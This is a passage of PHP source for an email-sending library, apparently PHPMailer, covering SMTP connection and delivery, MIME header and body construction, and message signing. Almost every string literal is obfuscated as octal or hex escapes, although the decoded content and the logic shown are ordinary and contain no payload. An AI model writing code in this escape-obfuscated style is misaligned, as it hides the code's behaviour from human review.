$this->smtp; } public function setSMTPInstance(SMTP $smtp) { $this->smtp = $smtp; return $this->smtp; } protected function smtpSend($header, $body) { $bad_rcpt = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang("\163\155\164\160\x5f\x63\x6f\x6e\x6e\x65\143\164\x5f\146\x61\x69\x6c\145\144"), self::STOP_CRITICAL); } if ('' == $this->Sender) { $smtp_from = $this->From; } else { $smtp_from = $this->Sender; } if (!$this->smtp->mail($smtp_from)) { $this->setError($this->lang("\x66\162\157\155\137\x66\x61\x69\154\145\x64") . $smtp_from . "\40\x3a\40" . implode("\x2c", $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $callbacks = array(); foreach (array($this->to, $this->cc, $this->bcc) as $togroup) { foreach ($togroup as $to) { if (!$this->smtp->recipient($to[0], $this->dsn)) { $error = $this->smtp->getError(); $bad_rcpt[] = array("\164\x6f" => $to[0], "\x65\x72\162\157\x72" => $error["\x64\x65\x74\141\151\x6c"]); $isSent = false; } else { $isSent = true; } $callbacks[] = array("\151\x73\163\145\156\164" => $isSent, "\164\157" => $to[0]); } } if (count($this->all_recipients) > count($bad_rcpt) and !$this->smtp->data($header . $body)) { throw new Exception($this->lang("\x64\x61\x74\141\137\x6e\157\164\137\x61\143\x63\145\x70\164\x65\x64"), self::STOP_CRITICAL); } $smtp_transaction_id = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($callbacks as $cb) { $this->doCallback($cb["\x69\163\x73\145\x6e\164"], array($cb["\164\157"]), array(), array(), $this->Subject, $body, $this->From, array("\x73\155\x74\x70\x5f\x74\x72\141\x6e\x73\x61\x63\x74\151\157\x6e\x5f\151\144" => $smtp_transaction_id)); } if (count($bad_rcpt) > 0) { $errstr = ''; foreach ($bad_rcpt as $bad) { $errstr .= $bad["\164\157"] . "\72\x20" . $bad["\145\162\x72\x6f\x72"]; } throw new Exception($this->lang("\x72\145\x63\x69\x70\x69\x65\156\164\163\x5f\146\x61\x69\154\x65\x64") . $errstr, self::STOP_CONTINUE); } return true; } public function smtpConnect($options = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $options) { $options = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $hosts = explode("\x3b", $this->Host); $lastexception = null; foreach ($hosts as $hostentry) { $hostinfo = array(); if (!preg_match("\x2f\136\x28\x28\163\x73\x6c\x7c\164\x6c\x73\x29\x3a\134\x2f\134\x2f\x29\x2a\x28\x5b\141\55\172\101\x2d\132\x30\x2d\71\134\x2e\55\x5d\52\x7c\134\133\x5b\141\55\146\x41\55\x46\x30\x2d\71\x3a\135\x2b\134\135\x29\x3a\x3f\x28\x5b\60\55\71\135\x2a\x29\44\x2f", trim($hostentry), $hostinfo)) { static::edebug($this->lang("\143\x6f\x6e\x6e\145\143\x74\x5f\x68\157\163\164") . "\40" . $hostentry); continue; } if (!static::isValidHost($hostinfo[3])) { static::edebug($this->lang("\x63\157\x6e\x6e\145\x63\x74\x5f\150\x6f\163\x74") . "\x20" . $hostentry); continue; } $prefix = ''; $secure = $this->SMTPSecure; $tls = "\164\154\163" == $this->SMTPSecure; if ("\x73\163\154" == $hostinfo[2] or '' == $hostinfo[2] and "\x73\x73\x6c" == $this->SMTPSecure) { $prefix = "\x73\x73\x6c\x3a\x2f\x2f"; $tls = false; $secure = "\163\163\x6c"; } elseif ("\x74\154\x73" == $hostinfo[2]) { $tls = true; $secure = "\164\154\x73"; } $sslext = defined("\x4f\120\x45\x4e\x53\x53\114\x5f\101\114\x47\x4f\137\123\110\101\x32\65\x36"); if ("\164\154\x73" === $secure or "\163\x73\x6c" === $secure) { if (!$sslext) { throw new Exception($this->lang("\x65\170\x74\145\156\163\x69\157\156\x5f\x6d\151\163\x73\x69\156\147") . "\157\160\x65\156\x73\163\154", self::STOP_CRITICAL); } } $host = $hostinfo[3]; $port = $this->Port; $tport = (int) $hostinfo[4]; if ($tport > 0 and $tport < 65536) { $port = $tport; } if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) { try { if ($this->Helo) { $hello = $this->Helo; } else { $hello = $this->serverHostname(); } $this->smtp->hello($hello); if ($this->SMTPAutoTLS and $sslext and "\x73\x73\154" != $secure and $this->smtp->getServerExt("\123\x54\x41\x52\x54\x54\x4c\x53")) { $tls = true; } if ($tls) { if (!$this->smtp->startTLS()) { throw new Exception($this->lang("\143\157\156\x6e\x65\143\x74\x5f\x68\x6f\163\164")); } $this->smtp->hello($hello); } if ($this->SMTPAuth) { if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang("\141\165\164\x68\145\x6e\x74\151\143\x61\x74\x65")); } } return true; } catch (Exception $exc) { $lastexception = $exc; $this->edebug($exc->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions and null !== $lastexception) { throw $lastexception; } return false; } public function smtpClose() { if (null !== $this->smtp) { if ($this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } } public function setLanguage($langcode = "\x65\156", $lang_path = '') { $renamed_langcodes = array("\x62\x72" => "\160\x74\x5f\142\162", "\x63\x7a" => "\143\163", "\144\x6b" => "\x64\x61", "\156\157" => "\x6e\142", "\163\145" => "\163\x76", "\x72\x73" => "\163\x72", "\164\147" => "\164\x6c"); if (isset($renamed_langcodes[$langcode])) { $langcode = $renamed_langcodes[$langcode]; } $PHPMAILER_LANG = array("\x61\x75\164\x68\145\156\x74\151\x63\x61\x74\145" => "\x53\115\124\x50\x20\105\162\x72\x6f\x72\x3a\x20\x43\x6f\165\154\x64\40\156\x6f\164\x20\141\165\164\150\x65\156\x74\x69\x63\x61\x74\145\x2e", "\143\157\156\x6e\145\143\x74\137\x68\157\x73\164" => "\x53\115\124\x50\x20\105\162\162\157\x72\72\40\103\x6f\165\154\x64\x20\156\157\x74\x20\143\157\156\x6e\x65\143\x74\40\x74\x6f\40\x53\x4d\124\x50\40\x68\157\163\x74\x2e", "\144\141\x74\141\137\x6e\157\164\137\x61\143\x63\145\x70\164\145\144" => "\123\x4d\124\120\x20\105\x72\162\157\x72\x3a\x20\144\141\164\141\40\x6e\157\164\x20\141\x63\143\145\x70\x74\x65\x64\x2e", "\x65\155\160\164\x79\137\x6d\x65\x73\x73\x61\147\145" => "\x4d\x65\163\x73\141\147\145\x20\x62\157\x64\171\40\145\155\x70\164\171", "\x65\x6e\x63\x6f\x64\x69\x6e\x67" => "\x55\156\x6b\156\x6f\167\x6e\40\145\156\143\157\144\x69\x6e\x67\x3a\x20", "\145\x78\x65\x63\165\x74\145" => "\x43\157\165\154\144\40\x6e\x6f\164\x20\x65\x78\x65\143\x75\164\145\x3a\40", "\146\x69\x6c\x65\x5f\x61\x63\143\145\163\x73" => "\x43\157\x75\154\144\x20\156\157\x74\x20\141\x63\x63\x65\163\x73\x20\x66\x69\x6c\145\x3a\40", "\x66\x69\x6c\x65\137\157\160\145\156" => "\x46\x69\154\x65\x20\x45\162\x72\x6f\x72\x3a\40\x43\x6f\x75\154\144\40\156\x6f\164\x20\157\160\145\x6e\x20\x66\x69\154\x65\x3a\x20", "\146\162\x6f\x6d\x5f\x66\141\x69\154\145\x64" => "\x54\150\x65\x20\x66\157\154\154\157\x77\x69\x6e\147\x20\x46\162\x6f\x6d\40\141\x64\144\162\x65\x73\x73\40\146\141\x69\154\145\144\72\x20", "\x69\156\x73\x74\x61\x6e\x74\151\x61\x74\145" => "\x43\157\165\x6c\144\x20\x6e\x6f\x74\40\151\x6e\x73\x74\141\156\164\151\x61\x74\145\40\155\141\x69\154\x20\146\165\156\143\164\151\157\x6e\x2e", "\151\x6e\166\141\154\x69\x64\x5f\141\144\144\162\x65\163\163" => "\x49\x6e\x76\141\x6c\151\x64\40\141\x64\144\x72\x65\163\163\72\x20", "\x6d\141\x69\x6c\145\162\x5f\156\157\164\137\163\165\x70\x70\157\162\x74\145\144" => "\40\155\141\151\154\145\x72\40\x69\163\x20\156\157\x74\40\163\165\x70\x70\157\x72\x74\x65\x64\x2e", "\160\x72\157\x76\151\144\x65\x5f\x61\x64\x64\162\145\163\163" => "\131\157\x75\40\155\x75\x73\164\40\x70\x72\x6f\x76\x69\144\x65\40\x61\164\40\x6c\x65\141\163\164\x20\x6f\156\145\40\162\145\x63\151\160\x69\x65\156\x74\x20\145\155\x61\x69\x6c\x20\x61\144\x64\x72\145\163\x73\56", "\162\x65\x63\x69\160\151\x65\x6e\x74\x73\137\146\141\x69\x6c\x65\x64" => "\x53\x4d\x54\120\x20\x45\162\x72\157\162\72\40\124\x68\x65\x20\x66\x6f\x6c\x6c\x6f\x77\151\x6e\x67\x20\162\x65\x63\x69\x70\x69\145\x6e\x74\163\40\x66\x61\151\154\145\x64\72\40", "\x73\x69\x67\156\x69\156\147" => "\123\x69\147\x6e\151\x6e\147\x20\x45\162\x72\157\x72\x3a\40", "\x73\x6d\164\160\137\x63\157\x6e\x6e\x65\x63\164\137\x66\141\151\x6c\145\144" => "\x53\x4d\x54\120\40\x63\x6f\x6e\156\x65\x63\x74\50\x29\x20\146\141\151\x6c\145\144\56", "\x73\x6d\164\x70\137\x65\x72\x72\157\x72" => "\x53\x4d\124\120\x20\x73\145\162\166\x65\162\40\x65\x72\x72\x6f\x72\x3a\x20", "\x76\x61\162\151\141\x62\x6c\145\137\163\145\164" => "\x43\141\x6e\x6e\x6f\x74\40\163\x65\164\40\157\162\40\x72\x65\163\x65\164\x20\166\x61\x72\151\x61\142\x6c\x65\72\x20", "\145\x78\164\145\x6e\x73\x69\157\x6e\137\155\x69\163\163\151\156\x67" => "\x45\x78\164\x65\156\163\x69\x6f\x6e\x20\x6d\x69\163\x73\151\x6e\147\x3a\40"); if (empty($lang_path)) { $lang_path = dirname(__DIR__) . DIRECTORY_SEPARATOR . "\x6c\141\156\x67\165\x61\x67\145" . DIRECTORY_SEPARATOR; } if (!preg_match("\57\x5e\x5b\141\55\172\135\173\x32\175\x28\77\x3a\137\133\x61\55\172\x41\55\132\x5d\173\x32\x7d\x29\x3f\x24\57", $langcode)) { $langcode = "\x65\x6e"; } $foundlang = true; $lang_file = $lang_path . "\160\150\160\155\141\151\x6c\x65\x72\56\154\141\156\147\x2d" . $langcode . "\56\x70\150\x70"; if ("\x65\156" != $langcode) { if (!static::isPermittedPath($lang_file) || !file_exists($lang_file)) { $foundlang = false; } else { $foundlang = (include $lang_file); } } $this->language = $PHPMAILER_LANG; return (bool) $foundlang; } public function getTranslations() { return $this->language; } public function addrAppend($type, $addr) { $addresses = array(); foreach ($addr as $address) { $addresses[] = $this->addrFormat($address); } return $type . "\x3a\x20" . implode("\54\x20", $addresses) . static::$LE; } public function addrFormat($addr) { if (empty($addr[1])) { return $this->secureHeader($addr[0]); } return $this->encodeHeader($this->secureHeader($addr[1]), "\x70\150\x72\x61\163\x65") . "\x20\x3c" . $this->secureHeader($addr[0]) . "\x3e"; } public function wrapText($message, $length, $qp_mode = false) { if ($qp_mode) { $soft_break = sprintf("\x20\x3d\x25\163", static::$LE); } else { $soft_break = static::$LE; } $is_utf8 = static::CHARSET_UTF8 === strtolower($this->CharSet); $lelen = strlen(static::$LE); $crlflen = strlen(static::$LE); $message = static::normalizeBreaks($message); if (substr($message, -$lelen) == static::$LE) { $message = substr($message, 0, -$lelen); } $lines = explode(static::$LE, $message); $message = ''; foreach ($lines as $line) { $words = explode("\40", $line); $buf = ''; $firstword = true; foreach ($words as $word) { if ($qp_mode and strlen($word) > $length) { $space_left = $length - strlen($buf) - $crlflen; if (!$firstword) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif ("\75" == substr($word, $len - 1, 1)) { --$len; } elseif ("\x3d" == substr($word, $len - 2, 1)) { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= "\x20" . $part; $message .= $buf . sprintf("\x3d\x25\x73", static::$LE); } else { $message .= $buf . $soft_break; } $buf = ''; } while (strlen($word) > 0) { if ($length <= 0) { break; } $len = $length; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif ("\75" == substr($word, $len - 1, 1)) { --$len; } elseif ("\75" == substr($word, $len - 2, 1)) { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); if (strlen($word) > 0) { $message .= $part . sprintf("\x3d\45\163", static::$LE); } else { $buf = $part; } } } else { $buf_o = $buf; if (!$firstword) { $buf .= "\40"; } $buf .= $word; if (strlen($buf) > $length and '' != $buf_o) { $message .= $buf_o . $soft_break; $buf = $word; } } $firstword = false; } $message .= $buf . static::$LE; } return $message; } public function utf8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "\75"); if (false !== $encodedCharPos) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { if ($encodedCharPos > 0) { $maxLength -= $lookBack - $encodedCharPos; } $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength -= $lookBack - $encodedCharPos; $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case "\x61\154\164": case "\x61\154\x74\137\151\156\154\151\156\x65": case "\141\154\x74\x5f\141\164\164\x61\143\150": case "\x61\x6c\x74\137\x69\156\x6c\x69\156\x65\x5f\141\164\x74\x61\x63\x68": $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $result = ''; $result .= $this->headerLine("\104\x61\x74\x65", '' == $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ("\x6d\x61\151\x6c" != $this->Mailer) { foreach ($this->to as $toaddr) { $this->SingleToArray[] = $this->addrFormat($toaddr); } } } else { if (count($this->to) > 0) { if ("\x6d\x61\151\x6c" != $this->Mailer) { $result .= $this->addrAppend("\x54\x6f", $this->to); } } elseif (count($this->cc) == 0) { $result .= $this->headerLine("\124\157", "\x75\x6e\x64\x69\163\x63\x6c\x6f\x73\x65\x64\x2d\x72\145\x63\151\x70\x69\x65\156\164\x73\72\x3b"); } } $result .= $this->addrAppend("\106\x72\157\155", array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $result .= $this->addrAppend("\x43\x63", $this->cc); } if (("\163\145\x6e\144\155\x61\x69\x6c" == $this->Mailer or "\161\x6d\141\x69\x6c" == $this->Mailer or "\x6d\141\151\x6c" == $this->Mailer) and count($this->bcc) > 0) { $result .= $this->addrAppend("\x42\143\x63", $this->bcc); } if (count($this->ReplyTo) > 0) { $result .= $this->addrAppend("\122\145\160\154\x79\x2d\124\x6f", $this->ReplyTo); } if ("\x6d\x61\x69\154" != $this->Mailer) { $result .= $this->headerLine("\x53\165\142\152\x65\143\x74", $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' != $this->MessageID and preg_match("\x2f\136\74\x2e\52\100\x2e\52\x3e\x24\57", $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf("\74\x25\163\100\45\163\x3e", $this->uniqueid, $this->serverHostname()); } $result .= $this->headerLine("\x4d\145\163\163\141\x67\x65\x2d\x49\104", $this->lastMessageID); if (null !== $this->Priority) { $result .= $this->headerLine("\x58\55\x50\162\151\x6f\x72\151\x74\x79", $this->Priority); } if ('' == $this->XMailer) { $result .= $this->headerLine("\x58\x2d\x4d\141\x69\154\145\x72", "\x50\x48\x50\x4d\x61\151\x6c\x65\162\40" . self::VERSION); } else { $myXmailer = trim($this->XMailer); if ($myXmailer) { $result .= $this->headerLine("\130\55\x4d\141\151\x6c\x65\x72", $myXmailer); } } if ('' != $this->ConfirmReadingTo) { $result .= $this->headerLine("\x44\151\163\160\157\x73\151\x74\151\x6f\x6e\55\116\x6f\164\151\146\x69\x63\x61\x74\x69\157\x6e\55\124\157", "\x3c" . $this->ConfirmReadingTo . "\76"); } foreach ($this->CustomHeader as $header) { $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1]))); } if (!$this->sign_key_file) { $result .= $this->headerLine("\x4d\111\115\105\55\x56\x65\162\x73\151\157\156", "\61\56\60"); $result .= $this->getMailMIME(); } return $result; } public function getMailMIME() { $result = ''; $ismultipart = true; switch ($this->message_type) { case "\x69\156\154\151\x6e\x65": $result .= $this->headerLine("\x43\157\x6e\164\145\156\x74\x2d\x54\171\160\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\x3b"); $result .= $this->textLine("\11\x62\x6f\x75\156\144\x61\162\171\75\x22" . $this->boundary[1] . "\x22"); break; case "\141\x74\x74\141\x63\150": case "\x69\x6e\x6c\x69\156\x65\137\x61\x74\164\x61\143\150": case "\141\154\164\137\x61\164\164\x61\143\x68": case "\x61\x6c\164\137\151\x6e\154\x69\x6e\x65\137\x61\164\164\x61\x63\150": $result .= $this->headerLine("\x43\x6f\x6e\164\x65\x6e\164\x2d\124\x79\x70\x65", static::CONTENT_TYPE_MULTIPART_MIXED . "\x3b"); $result .= $this->textLine("\x9\x62\157\165\x6e\x64\x61\x72\171\75\42" . $this->boundary[1] . "\42"); break; case "\x61\x6c\x74": case "\141\x6c\164\x5f\151\x6e\x6c\x69\x6e\145": $result .= $this->headerLine("\103\x6f\156\164\145\x6e\164\55\x54\x79\160\145", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\73"); $result .= $this->textLine("\11\142\157\165\x6e\144\141\x72\171\x3d\42" . $this->boundary[1] . "\x22"); break; default: $result .= $this->textLine("\103\x6f\x6e\x74\145\x6e\164\x2d\x54\x79\160\x65\x3a\40" . $this->ContentType . "\73\x20\x63\x68\x61\x72\x73\145\164\75" . $this->CharSet); $ismultipart = false; break; } if (static::ENCODING_7BIT != $this->Encoding) { if ($ismultipart) { if (static::ENCODING_8BIT == $this->Encoding) { $result .= $this->headerLine("\x43\157\x6e\164\x65\x6e\x74\x2d\x54\x72\141\x6e\x73\x66\x65\162\55\105\x6e\x63\x6f\x64\151\156\147", static::ENCODING_8BIT); } } else { $result .= $this->headerLine("\x43\x6f\156\x74\x65\x6e\164\55\x54\x72\141\156\x73\x66\x65\x72\x2d\105\x6e\143\157\144\151\156\147", $this->Encoding); } } if ("\x6d\141\151\x6c" != $this->Mailer) { $result .= static::$LE; } return $result; } public function getSentMIMEMessage() { return rtrim($this->MIMEHeader . $this->mailHeader, "\12\15") . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $len = 32; if (function_exists("\x72\141\156\144\x6f\x6d\x5f\x62\x79\x74\145\163")) { $bytes = random_bytes($len); } elseif (function_exists("\x6f\x70\145\x6e\x73\x73\154\x5f\x72\141\x6e\144\157\x6d\137\160\x73\x65\165\x64\157\x5f\142\171\164\x65\163")) { $bytes = openssl_random_pseudo_bytes($len); } else { $bytes = hash("\163\x68\x61\62\65\66", uniqid((string) mt_rand(), true), true); } return str_replace(array("\x3d", "\53", "\57"), '', base64_encode(hash("\163\150\x61\x32\65\66", $bytes, true))); } public function createBody() { $body = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = "\x62\x31\137" . $this->uniqueid; $this->boundary[2] = "\x62\x32\137" . $this->uniqueid; $this->boundary[3] = "\142\x33\x5f" . $this->uniqueid; if ($this->sign_key_file) { $body .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $bodyEncoding = $this->Encoding; $bodyCharSet = $this->CharSet; if (static::ENCODING_8BIT == $bodyEncoding and !$this->has8bitChars($this->Body)) { $bodyEncoding = static::ENCODING_7BIT; $bodyCharSet = "\165\x73\x2d\141\163\143\x69\x69"; } if (static::ENCODING_BASE64 != $this->Encoding and static::hasLineLongerThanMax($this->Body)) { $bodyEncoding = static::ENCODING_QUOTED_PRINTABLE; } $altBodyEncoding = $this->Encoding; $altBodyCharSet = $this->CharSet; if (static::ENCODING_8BIT == $altBodyEncoding and !$this->has8bitChars($this->AltBody)) { $altBodyEncoding = static::ENCODING_7BIT; $altBodyCharSet = "\165\163\55\141\163\143\x69\151"; } if (static::ENCODING_BASE64 != $altBodyEncoding and static::hasLineLongerThanMax($this->AltBody)) { $altBodyEncoding = static::ENCODING_QUOTED_PRINTABLE; } $mimepre = "\x54\150\x69\163\x20\x69\x73\40\x61\40\155\x75\x6c\164\x69\x2d\160\141\x72\x74\x20\155\x65\x73\163\141\x67\x65\x20\x69\x6e\x20\115\x49\x4d\105\x20\146\157\162\x6d\141\164\x2e" . static::$LE; switch ($this->message_type) { case "\x69\x6e\154\x69\x6e\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x69\156\154\151\x6e\x65", $this->boundary[1]); break; case "\x61\x74\x74\x61\143\150": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\141\164\x74\141\143\150\155\145\156\x74", $this->boundary[1]); break; case "\151\x6e\x6c\x69\x6e\145\x5f\141\164\164\x61\x63\150": $body .= $mimepre; $body .= $this->textLine("\55\x2d" . $this->boundary[1]); $body .= $this->headerLine("\x43\x6f\x6e\164\x65\156\x74\55\x54\x79\160\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\73"); $body .= $this->textLine("\x9\142\157\x75\x6e\144\141\162\x79\x3d\42" . $this->boundary[2] . "\42"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x69\x6e\x6c\x69\156\x65", $this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\141\164\x74\x61\x63\x68\155\x65\x6e\x74", $this->boundary[1]); break; case "\x61\154\x74": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . "\73\x20\x6d\145\x74\x68\x6f\x64\x3d\122\x45\x51\x55\x45\x53\124", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); $body .= static::$LE; } $body .= $this->endBoundary($this->boundary[1]); break; case "\141\154\x74\x5f\x69\x6e\x6c\151\x6e\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\x6f\x6e\164\x65\x6e\164\x2d\x54\x79\x70\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\73"); $body .= $this->textLine("\x9\x62\157\x75\156\x64\141\x72\x79\75\42" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x69\156\x6c\x69\156\145", $this->boundary[2]); $body .= static::$LE; $body .= $this->endBoundary($this->boundary[1]); break; case "\141\x6c\x74\x5f\x61\164\x74\141\x63\150": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\156\164\x65\156\164\55\124\171\160\145", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\73"); $body .= $this->textLine("\11\142\x6f\165\x6e\144\141\162\x79\x3d\42" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . "\x3b\40\x6d\145\164\x68\x6f\144\75\x52\105\121\125\x45\123\x54", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); } $body .= $this->endBoundary($this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\141\x74\164\141\143\x68\x6d\145\x6e\x74", $this->boundary[1]); break; case "\141\x6c\164\137\151\156\154\x69\x6e\145\x5f\x61\x74\164\141\143\x68": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\x43\x6f\x6e\164\x65\x6e\164\55\x54\x79\160\x65", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\x3b"); $body .= $this->textLine("\11\x62\x6f\x75\x6e\x64\x61\162\x79\x3d\x22" . $this->boundary[2] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= static::$LE; $body .= $this->textLine("\55\x2d" . $this->boundary[2]); $body .= $this->headerLine("\103\157\156\x74\x65\x6e\164\x2d\x54\x79\160\145", static::CONTENT_TYPE_MULTIPART_RELATED . "\73"); $body .= $this->textLine("\11\x62\157\165\x6e\144\x61\x72\x79\75\x22" . $this->boundary[3] . "\x22"); $body .= static::$LE; $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= static::$LE; $body .= $this->attachAll("\x69\x6e\154\x69\156\145", $this->boundary[3]); $body .= static::$LE; $body .= $this->endBoundary($this->boundary[2]); $body .= static::$LE; $body .= $this->attachAll("\141\x74\x74\141\143\150\155\x65\156\x74", $this->boundary[1]); break; default: $this->Encoding = $bodyEncoding; $body .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $body = ''; if ($this->exceptions) { throw new Exception($this->lang("\145\x6d\160\x74\x79\x5f\x6d\x65\x73\163\141\x67\x65"), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined("\120\x4b\103\x53\67\137\124\x45\x58\x54")) { throw new Exception($this->lang("\x65\170\x74\x65\x6e\163\x69\x6f\156\137\155\x69\163\163\x69\x6e\x67") . "\157\160\145\156\163\x73\x6c"); } $file = fopen("\x70\150\160\72\57\x2f\x74\145\155\x70", "\162\142\x2b"); $signed = fopen("\160\150\x70\72\57\x2f\164\x65\x6d\x70", "\162\142\53"); fwrite($file, $body); if (empty($this->sign_extracerts_file)) { $sign = @openssl_pkcs7_sign($file, $signed, "\146\151\x6c\x65\72\57\x2f" . realpath($this->sign_cert_file), array("\x66\151\x6c\145\x3a\57\57" . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $sign = @openssl_pkcs7_sign($file, $signed, "\146\151\x6c\145\x3a\x2f\x2f" . realpath($this->sign_cert_file), array("\146\x69\154\145\72\x2f\57" . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } fclose($file); if ($sign) { $body = file_get_contents($signed); fclose($signed); $parts = explode("\12\12", $body, 2); $this->MIMEHeader .= $parts[0] . static::$LE . static::$LE; $body = $parts[1]; } else { fclose($signed); throw new Exception($this->lang("\163\x69\147\x6e\151\x6e\x67") . openssl_error_string()); } } catch (Exception $exc) { $body = ''; if ($this->exceptions) { throw $exc; } } } return $body; } protected function getBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if ('' == $charSet) { $charSet = $this->CharSet; } if ('' == $contentType) { $contentType = $this->ContentType; } if ('' == $encoding) { $encoding = $this->Encoding; } $result .= $this->textLine("\x2d\x2d" . $boundary); $result .= sprintf("\x43\157\x6e\x74\145\156\x74\x2d\124\171\x70\145\72\40\x25\x73\x3b\40\143\150\x61\x72\x73\145\x74\75\x25\x73", $contentType, $charSet); $result .= static::$LE; if (static::ENCODING_7BIT != $encoding) { $result .= $this->headerLine("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\162\141\x6e\x73\146\145\x72\55\105\156\143\x6f\x64\151\156\147", $encoding); } $result .= static::$LE; return $result; } protected function endBoundary($boundary) { return static::$LE . "\x2d\55" . $boundary . "\55\x2d" . static::$LE; } protected function setMessageType() { $type = array(); if ($this->alternativeExists()) { $type[] = "\141\154\x74"; } if ($this->inlineImageExists()) { $type[] = "\151\156\x6c\151\156\x65"; } if ($this->attachmentExists()) { $type[] = "\141\x74\164\x61\143\x68"; } $this->message_type = implode("\x5f", $type); if ('' == $this->message_type) { $this->message_type = "\160\x6c\141\x69\156"; } } public function headerLine($name, $value) { return $name . "\72\x20" . $value . 